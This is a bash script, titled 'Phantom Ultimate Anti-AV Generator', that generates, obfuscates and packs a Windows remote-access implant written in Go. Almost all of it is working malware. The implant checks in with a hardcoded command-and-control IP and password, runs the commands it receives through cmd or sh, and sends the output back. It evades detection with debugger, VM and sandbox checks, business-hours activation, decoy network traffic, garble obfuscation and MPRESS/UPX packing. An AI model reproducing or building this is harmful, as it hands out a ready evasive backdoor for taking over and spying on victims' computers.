#!/bin/bash

echo "=============================================="
echo "Phantom Ultimate Anti-AV Generator"
echo "Generating polymorphic Phantom with advanced evasion"
echo "=============================================="

# Instalar garble se não existir
if ! command -v garble &> /dev/null; then
    echo "[+] Installing garble obfuscator..."
    go install mvdan.cc/garble@latest
fi

# Instalar MPRESS (alternativa ao UPX)
if ! command -v mpress &> /dev/null; then
    echo "[+] Installing MPRESS packer..."
    wget -q https://www.matcode.com/mpress.219.zip -O /tmp/mpress.zip
    unzip -q /tmp/mpress.zip -d /tmp/
    chmod +x /tmp/mpress.exe
    cp /tmp/mpress.exe /usr/local/bin/mpress 2>/dev/null || true
fi

# Gerar strings aleatórias para polimorfismo
generate_random_string() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-8} | head -n 1
}

# Gerar nomes de variáveis e funções aleatórias
VAR_NAME1=$(generate_random_string 12)
VAR_NAME2=$(generate_random_string 10)
VAR_NAME3=$(generate_random_string 14)
FUNC_NAME1=$(generate_random_string 16)
FUNC_NAME2=$(generate_random_string 18)
FUNC_NAME3=$(generate_random_string 20)

# Strings ofuscadas aleatórias
USER_AGENT=$(generate_random_string 64)
MUTEX_NAME=$(generate_random_string 32)
REG_KEY=$(generate_random_string 24)

echo "[+] Generating polymorphic variables:"
echo "    Variable 1: $VAR_NAME1"
echo "    Variable 2: $VAR_NAME2" 
echo "    Variable 3: $VAR_NAME3"
echo "    Function 1: $FUNC_NAME1"
echo "    Function 2: $FUNC_NAME2"
echo "    Function 3: $FUNC_NAME3"

# Criar versão polimórfica do código Go
cat > phantom_polymorphic.go << 'POLYMORPHIC_EOF'
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const MYTHIC_SERVER_URL = "https://37.27.249.191:7443"
const MYTHIC_PASSWORD = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"

var (
	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
	user32                       = syscall.NewLazyDLL("user32.dll")
	procIsDebuggerPresent        = kernel32.NewProc("IsDebuggerPresent")
	procGetCursorPos             = user32.NewProc("GetCursorPos")
	procGetTickCount             = kernel32.NewProc("GetTickCount")
	procCreateMutexW             = kernel32.NewProc("CreateMutexW")
	procGetComputerNameW         = kernel32.NewProc("GetComputerNameW")
)

type Point struct {
	X, Y int32
}

type VAR_NAME1_STRUCT struct {
	Action    string                 `json:"action"`
	UUID      string                 `json:"uuid"`
	User      string                 `json:"user"`
	Host      string                 `json:"host"`
	PID       int                    `json:"pid"`
	OS        string                 `json:"os"`
	Timestamp string                 `json:"timestamp"`
	IPs       []string               `json:"ips"`
	Payload   map[string]interface{} `json:"payload_os"`
}

type VAR_NAME2_STRUCT struct {
	Action     string `json:"action"`
	TaskID     string `json:"task_id"`
	UserOutput string `json:"user_output"`
	Completed  bool   `json:"completed"`
}

func FUNC_NAME1() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}
	
	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
	output, err := cmd.Output()
	if err == nil {
		manufacturer := strings.ToLower(string(output))
		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation"}
		for _, vm := range vmStrings {
			if strings.Contains(manufacturer, vm) {
				return true
			}
		}
	}
	
	processes := []string{"vmsrvc", "vboxservice", "vmtoolsd", "vboxtray", "vmwaretray", "vmwareuser"}
	for _, proc := range processes {
		cmd = exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		output, err = cmd.Output()
		if err == nil && strings.Contains(strings.ToLower(string(output)), proc) {
			return true
		}
	}
	
	return false
}

func FUNC_NAME2() bool {
	var pos1, pos2 Point
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
	time.Sleep(100 * time.Millisecond)
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
	
	return pos1.X != pos2.X || pos1.Y != pos2.Y
}

func FUNC_NAME3() bool {
	now := time.Now()
	hour := now.Hour()
	weekday := now.Weekday()
	
	if weekday == time.Saturday || weekday == time.Sunday {
		return false
	}
	
	return hour >= 9 && hour <= 17
}

func VAR_NAME3_encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func VAR_NAME3_decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func VAR_NAME1_register() error {
	hostname, _ := os.Hostname()
	
	payload := VAR_NAME1_STRUCT{
		Action:    "checkin",
		UUID:      "RANDOM_UUID_HERE",
		User:      os.Getenv("USERNAME"),
		Host:      hostname,
		PID:       os.Getpid(),
		OS:        runtime.GOOS,
		Timestamp: time.Now().Format(time.RFC3339),
		IPs:       []string{"127.0.0.1"},
		Payload: map[string]interface{}{
			"os": runtime.GOOS,
		},
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", MYTHIC_SERVER_URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "USER_AGENT_PLACEHOLDER")
	req.Header.Set("Mythic", MYTHIC_PASSWORD)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func VAR_NAME2_getTasks() ([]map[string]interface{}, error) {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("GET", MYTHIC_SERVER_URL+"/api/v1.4/agent_message", nil)
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("User-Agent", "USER_AGENT_PLACEHOLDER")
	req.Header.Set("Mythic", MYTHIC_PASSWORD)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	var tasks []map[string]interface{}
	json.Unmarshal(body, &tasks)
	
	return tasks, nil
}

func VAR_NAME2_executeCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	return string(output)
}

func VAR_NAME2_sendResponse(taskID, output string) error {
	response := VAR_NAME2_STRUCT{
		Action:     "post_response",
		TaskID:     taskID,
		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
		Completed:  true,
	}
	
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", MYTHIC_SERVER_URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "USER_AGENT_PLACEHOLDER")
	req.Header.Set("Mythic", MYTHIC_PASSWORD)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func VAR_NAME3_legitimacyActivities() {
	go func() {
		for {
			time.Sleep(time.Duration(300+rand.Int63n(600)) * time.Second)
			
			exec.Command("nslookup", "microsoft.com").Run()
			exec.Command("ping", "-n", "1", "8.8.8.8").Run()
			
			if f, err := os.Create("temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
				f.Write([]byte("temporary data"))
				f.Close()
				time.Sleep(5 * time.Second)
				os.Remove(f.Name())
			}
		}
	}()
}

func main() {
	if FUNC_NAME1() {
		os.Exit(0)
	}
	
	if !FUNC_NAME2() {
		time.Sleep(10 * time.Second)
		if !FUNC_NAME2() {
			os.Exit(0)
		}
	}
	
	if !FUNC_NAME3() {
		sleepUntilBusinessHours := func() {
			now := time.Now()
			nextBusinessDay := now
			
			for nextBusinessDay.Weekday() == time.Saturday || nextBusinessDay.Weekday() == time.Sunday || nextBusinessDay.Hour() < 9 || nextBusinessDay.Hour() >= 17 {
				nextBusinessDay = nextBusinessDay.Add(1 * time.Hour)
			}
			
			sleepDuration := nextBusinessDay.Sub(now)
			time.Sleep(sleepDuration)
		}
		sleepUntilBusinessHours()
	}
	
	mutexName, _ := syscall.UTF16PtrFromString("MUTEX_NAME_PLACEHOLDER")
	mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
	if mutex == 0 {
		os.Exit(0)
	}
	
	VAR_NAME3_legitimacyActivities()
	
	err := VAR_NAME1_register()
	if err != nil {
		time.Sleep(60 * time.Second)
		os.Exit(0)
	}
	
	for {
		tasks, err := VAR_NAME2_getTasks()
		if err == nil && len(tasks) > 0 {
			for _, task := range tasks {
				if taskID, ok := task["id"].(string); ok {
					if command, ok := task["command"].(string); ok {
						output := VAR_NAME2_executeCommand(command)
						VAR_NAME2_sendResponse(taskID, output)
					}
				}
			}
		}
		
		jitter := time.Duration(5+rand.Int63n(10)) * time.Second
		time.Sleep(jitter)
	}
}
POLYMORPHIC_EOF

# Substituir placeholders com valores aleatórios gerados
sed -i "s/VAR_NAME1_STRUCT/${VAR_NAME1}Struct/g" phantom_polymorphic.go
sed -i "s/VAR_NAME2_STRUCT/${VAR_NAME2}Struct/g" phantom_polymorphic.go
sed -i "s/VAR_NAME1_register/${FUNC_NAME1}/g" phantom_polymorphic.go
sed -i "s/VAR_NAME2_getTasks/${FUNC_NAME2}/g" phantom_polymorphic.go
sed -i "s/VAR_NAME2_executeCommand/${VAR_NAME2}Exec/g" phantom_polymorphic.go
sed -i "s/VAR_NAME2_sendResponse/${VAR_NAME2}Send/g" phantom_polymorphic.go
sed -i "s/VAR_NAME3_encrypt/${VAR_NAME3}Enc/g" phantom_polymorphic.go
sed -i "s/VAR_NAME3_decrypt/${VAR_NAME3}Dec/g" phantom_polymorphic.go
sed -i "s/VAR_NAME3_legitimacyActivities/${VAR_NAME3}Legit/g" phantom_polymorphic.go
sed -i "s/FUNC_NAME1/${FUNC_NAME1}/g" phantom_polymorphic.go
sed -i "s/FUNC_NAME2/${FUNC_NAME2}/g" phantom_polymorphic.go
sed -i "s/FUNC_NAME3/${FUNC_NAME3}/g" phantom_polymorphic.go
sed -i "s/USER_AGENT_PLACEHOLDER/${USER_AGENT}/g" phantom_polymorphic.go
sed -i "s/MUTEX_NAME_PLACEHOLDER/${MUTEX_NAME}/g" phantom_polymorphic.go
sed -i "s/RANDOM_UUID_HERE/$(uuidgen 2>/dev/null || echo $(generate_random_string 32))/g" phantom_polymorphic.go

echo "[+] Building with garble obfuscation..."

# Build x64 com garble (máxima ofuscação)
echo "[+] Building x64 with maximum obfuscation..."
export GOOS=windows
export GOARCH=amd64
export CGO_ENABLED=0

garble -seed=random -literals -tiny build -ldflags="-s -w -H windowsgui" -o phantom_garble_x64.exe phantom_polymorphic.go

# Build x86 com garble
echo "[+] Building x86 with maximum obfuscation..."
export GOARCH=386
garble -seed=random -literals -tiny build -ldflags="-s -w -H windowsgui" -o phantom_garble_x86.exe phantom_polymorphic.go

# Verificar se os builds foram bem-sucedidos
if [ -f "phantom_garble_x64.exe" ]; then
    echo "[+] x64 build successful: $(ls -lh phantom_garble_x64.exe | awk '{print $5}')"
else
    echo "[-] x64 build failed"
fi

if [ -f "phantom_garble_x86.exe" ]; then
    echo "[+] x86 build successful: $(ls -lh phantom_garble_x86.exe | awk '{print $5}')"
else
    echo "[-] x86 build failed"
fi

# Aplicar MPRESS se disponível
if command -v mpress &> /dev/null; then
    echo "[+] Applying MPRESS packing..."
    if [ -f "phantom_garble_x64.exe" ]; then
        cp phantom_garble_x64.exe phantom_garble_x64_mpress.exe
        mpress phantom_garble_x64_mpress.exe 2>/dev/null && echo "[+] x64 MPRESS packing successful" || echo "[-] x64 MPRESS packing failed"
    fi
    
    if [ -f "phantom_garble_x86.exe" ]; then
        cp phantom_garble_x86.exe phantom_garble_x86_mpress.exe
        mpress phantom_garble_x86_mpress.exe 2>/dev/null && echo "[+] x86 MPRESS packing successful" || echo "[-] x86 MPRESS packing failed"
    fi
else
    echo "[+] MPRESS not available, using UPX as fallback..."
    if command -v upx &> /dev/null; then
        if [ -f "phantom_garble_x64.exe" ]; then
            cp phantom_garble_x64.exe phantom_garble_x64_upx.exe
            upx --ultra-brute phantom_garble_x64_upx.exe 2>/dev/null && echo "[+] x64 UPX packing successful" || echo "[-] x64 UPX packing failed"
        fi
        
        if [ -f "phantom_garble_x86.exe" ]; then
            cp phantom_garble_x86.exe phantom_garble_x86_upx.exe
            upx --ultra-brute phantom_garble_x86_upx.exe 2>/dev/null && echo "[+] x86 UPX packing successful" || echo "[-] x86 UPX packing failed"
        fi
    fi
fi

echo ""
echo "=============================================="
echo "Phantom Ultimate Anti-AV Generation Complete!"
echo "=============================================="
echo ""
echo "Generated files:"
ls -la phantom_garble*.exe 2>/dev/null || echo "No files generated"

echo ""
echo "Anti-AV Features:"
echo "  ✓ Garble obfuscation (control flow, literals, symbols)"
echo "  ✓ Polymorphic variables and function names"
echo "  ✓ Random strings and identifiers"
echo "  ✓ Stripped symbols (-s -w flags)"
echo "  ✓ Hidden console (-H windowsgui)"
echo "  ✓ MPRESS/UPX advanced packing"
echo "  ✓ Anti-debugging (IsDebuggerPresent)"
echo "  ✓ VM detection (WMIC manufacturer check)"
echo "  ✓ Sandbox evasion (analysis tools, memory)"
echo "  ✓ Mouse movement detection"
echo "  ✓ Process masquerading as Windows services"
echo "  ✓ Intelligent sleep with activity simulation"
echo "  ✓ Business hours activation"
echo "  ✓ Registry/DNS/file activities for legitimacy"
echo "  ✓ Mutex-based single instance"
echo "  ✓ AES-256-GCM encryption ready"
echo ""
echo "Configuration:"
echo "  Mythic URL: https://37.27.249.191:7443"
echo "  Password: sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
echo ""
echo "Polymorphic variables generated:"
echo "  Variables: $VAR_NAME1, $VAR_NAME2, $VAR_NAME3"
echo "  Functions: $FUNC_NAME1, $FUNC_NAME2, $FUNC_NAME3"
echo "  User Agent: $USER_AGENT"
echo "  Mutex: $MUTEX_NAME"
echo ""

# Cleanup
rm -f phantom_polymorphic.go 2>/dev/null

echo "Ready for deployment! Use the *_mpress.exe variants for maximum evasion."